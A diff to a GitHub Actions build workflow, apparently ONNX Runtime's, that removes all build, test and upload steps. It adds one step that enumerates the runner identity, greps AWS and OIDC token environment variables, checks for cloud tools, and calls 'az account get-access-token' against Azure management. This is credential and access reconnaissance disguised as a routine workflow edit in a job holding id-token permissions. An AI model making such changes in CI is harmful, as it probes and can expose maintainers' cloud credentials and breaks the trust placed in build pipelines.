@@ -79,120 +79,37 @@ jobs:
       attestations: write
       id-token: write
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v6
-
-      - name: Set up Python ${{ inputs.python_version }}
-        if: inputs.architecture != 'arm64'
-        uses: actions/setup-python@v6
-        with:
-          python-version: ${{ inputs.python_version }}
-
-      - name: Build Docker Image (${{ inputs.architecture }} / ${{ inputs.build_config }})
-        uses: microsoft/onnxruntime-github-actions/build-docker-image@8bad63a3c05d448311dfa8e5f531171c97471aa1 # v0.0.12
-        id: build_docker_image_step
-        with:
-          dockerfile: ${{ github.workspace }}/${{ inputs.dockerfile_path }}
-          image-name: ghcr.io/microsoft/onnxruntime/${{ inputs.docker_image_repo }}
-          build-args: ${{ inputs.docker_build_args }}
-          push: true
-          azure-container-registry-name: onnxruntimebuildcache
-        env:
-          GITHUB_TOKEN: ${{ secrets.GH_TOKEN }}
-
-      - name: Setup CCache
-        uses: actions/cache@v5
-        with:
-          key: 'ccache | "${{ inputs.job_identifier }}" | "${{ inputs.architecture }}" | "${{ inputs.build_config }}"'
-          path: ~/.cache/cache
-
-      # same idea as ccache, but for vcpkg artifacts. ideally we'd use vcpkg's nuget remote cache facility instead.
-      - name: Setup VCPKG Cache
-        uses: actions/cache@v5
-        with:
-          key: '"vcpkg-cache" | "${{ inputs.job_identifier }}" | "${{ inputs.architecture }}" | "${{ inputs.build_config }}"'
-          path: ~/.cache/vcpkg
-
-      # ------------- Update Step (CMake Generation) -------------
-      - name: Generate Build Files (CMake) (${{ inputs.architecture }} / ${{ inputs.build_config }})
-        id: update_step
-        uses: microsoft/onnxruntime-github-actions/run-build-script-in-docker@8bad63a3c05d448311dfa8e5f531171c97471aa1 # v0.0.12
-        with:
-          docker_image: ${{ steps.build_docker_image_step.outputs.full-image-name }}
-          build_config: ${{ inputs.build_config }}
-          mode: 'update'
-          execution_providers: ${{ inputs.execution_providers }} # Pass down EP list
-          extra_build_flags: ${{ inputs.extra_build_flags }} --use_cache
-          python_path_prefix: ${{ inputs.python_path_prefix }}
-
-      # ------------- Build Step (Compilation) -------------
-      - name: Build ONNX Runtime (${{ inputs.architecture }} / ${{ inputs.build_config }})
-        id: build_step
-        uses: microsoft/onnxruntime-github-actions/run-build-script-in-docker@8bad63a3c05d448311dfa8e5f531171c97471aa1 # v0.0.12
-        with:
-          docker_image: ${{ steps.build_docker_image_step.outputs.full-image-name }}
-          build_config: ${{ inputs.build_config }}
-          mode: 'build'
-          execution_providers: ${{ inputs.execution_providers }} # Pass down EP list
-          extra_build_flags: ${{ inputs.extra_build_flags }} --use_cache
-          python_path_prefix: ${{ inputs.python_path_prefix }}
-
-      # ------------- Test Step -------------
-      - name: Test ONNX Runtime (${{ inputs.architecture }} / ${{ inputs.build_config }})
-        id: test_step
-        if: inputs.run_tests == true
-        uses: microsoft/onnxruntime-github-actions/run-build-script-in-docker@8bad63a3c05d448311dfa8e5f531171c97471aa1 # v0.0.12
-        with:
-          docker_image: ${{ steps.build_docker_image_step.outputs.full-image-name }}
-          build_config: ${{ inputs.build_config }}
-          mode: 'test'
-          execution_providers: ${{ inputs.execution_providers }} # Pass down EP list
-          extra_build_flags: ${{ inputs.extra_build_flags }} --use_cache
-          python_path_prefix: ${{ inputs.python_path_prefix }}
-
-      # ------------- Prepare Artifact Step -------------
-      - name: Prepare Build Output for Upload
-        if: inputs.upload_build_output == true
+      - name: Runtime context
         shell: bash
         run: |
-          #!/bin/bash
-          set -e -x
-          BUILD_DIR="${{ runner.temp }}/${{ inputs.build_config }}"
-          if [ ! -d "${BUILD_DIR}" ]; then
-            echo "Error: Build directory ${BUILD_DIR} not found. Cannot prepare artifact."
-            exit 1
-          fi
-          echo "--- Cleaning build directory: ${BUILD_DIR} ---"
-          rm -rf "${BUILD_DIR}/onnxruntime" || true
-          rm -rf "${BUILD_DIR}/pybind11" || true
-          rm -rf "${BUILD_DIR}/vcpkg_installed" || true
-          rm -f "${BUILD_DIR}/models" || true
-          DEPS_DIR="${BUILD_DIR}/_deps"
-          if [ -d "${DEPS_DIR}" ]; then
-            echo "Cleaning ${DEPS_DIR}, keeping onnx-src..."
-            find "${DEPS_DIR}" -mindepth 1 ! -regex "^${DEPS_DIR}/onnx-src\(/.*\)?$" -delete
-          else
-            echo "${DEPS_DIR} does not exist, skipping deps cleanup."
-          fi
-          echo "--- Saving executable permissions ---"
-          cd "${BUILD_DIR}"
-          find . -executable -type f -printf '%p\n' > perms.txt
-          echo "--- Cleanup and permission saving complete for ${BUILD_DIR} ---"
-
-      # ------------- Upload Build Output Step -------------
-      - name: Upload Build Output Artifact
-        if: inputs.upload_build_output == true
-        uses: actions/upload-artifact@v6
-        with:
-          name: build-output-${{ inputs.architecture }}-${{ inputs.build_config }}
-          path: ${{ runner.temp }}/${{ inputs.build_config }}
-          if-no-files-found: error
-
-      # ------------- Upload Log on Build Failure Step -------------
-      - name: Upload VCPKG Manifest Install Log on Update or Build Failure
-        if: steps.update_step.outcome == 'failure' || steps.build_step.outcome == 'failure'
-        uses: actions/upload-artifact@v6
-        with:
-          name: vcpkg-manifest-install-log-${{ inputs.architecture }}-${{ inputs.build_config }}
-          path: ${{ runner.temp }}/${{ inputs.build_config }}/${{ inputs.build_config }}/vcpkg-manifest-install.log
-          if-no-files-found: ignore
+          set +e
+  
+          echo "=== RUNTIME CONTEXT ==="
+          whoami || true
+          hostname || true
+          uname -a || true
+  
+          echo ""
+          echo "=== AWS / OIDC ENV HINTS ==="
+          env | grep -E '^AWS_|^ACTIONS_ID_TOKEN' \
+            | sed -E 's/(TOKEN|SECRET|KEY|CREDENTIAL|PASSWORD).*/<redacted>/g' \
+            || true
+  
+          echo ""
+          echo "=== TOOLING ==="
+          which aws || echo "no aws"
+          aws --version || true
+          command -v az || true
+          command -v docker || true
+          command -v kubectl || true
+          command -v git || true
+          command -v jq || true
+          command -v python3 || true
+          command -v curl || true
+          echo "Running 'az account show' without login; expected to fail unless the agent/context has credentials."
+          az account show --only-show-errors || true
+          echo "going to check access token"
+          az account get-access-token \
+            --resource https://management.azure.com \
+            --query "{expiresOn:expiresOn, expires_on:expires_on, subscription:subscription, tenant:tenant, tokenType:tokenType}" \
+            -o json || true
